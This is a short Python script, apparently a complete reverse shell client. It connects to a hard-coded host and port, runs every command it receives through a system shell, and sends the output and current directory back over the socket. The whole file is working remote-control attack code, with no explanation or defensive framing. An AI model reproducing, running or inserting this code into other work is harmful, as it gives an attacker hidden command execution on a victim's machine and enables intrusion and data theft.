import socket
import os
import subprocess

host = "10.112.194.233"
port = 9989

s = socket.socket()
s.connect((host, port))

while True:
    data = s.recv(4096) 
    if len(data) == 0:
        break

    command = data.decode("utf-8").strip()

    if command.startswith("cd "):
        try:
            os.chdir(command[3:])
            s.send(str.encode(os.getcwd() + "> "))
        except Exception as e:
            s.send(str.encode("cd error: " + str(e) + "\n" + os.getcwd() + "> "))
        continue

    try:
        cmd = subprocess.Popen(command, shell=True,
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output, error = cmd.communicate()
        outputStrData = (output + error).decode("utf-8")

        currentWD = os.getcwd() + "> "
        s.send(str.encode(outputStrData + currentWD))
        print(outputStrData)
    except Exception as e:
        s.send(str.encode(f"Command failed: {str(e)}\n{os.getcwd()} > "))
